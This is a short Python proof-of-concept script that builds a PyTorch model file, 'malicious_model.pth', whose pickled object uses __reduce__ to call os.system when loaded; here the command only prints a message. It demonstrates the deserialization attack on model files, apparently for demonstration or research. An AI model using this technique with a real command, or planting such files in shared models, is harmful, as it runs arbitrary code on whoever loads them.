import pickle
import torch

#this class uses __reduce__ to embed a command that runs on deserialization
class MaliciousPayload:
    def __reduce__(self):
        import os
        return (os.system, ("python3 -c \"print('goodbye world!')\"",))

#creating an instance of our payload object
payload = MaliciousPayload()
torch.save(payload, "malicious_model.pth")

print("malicious_model.pth has been created successfully.")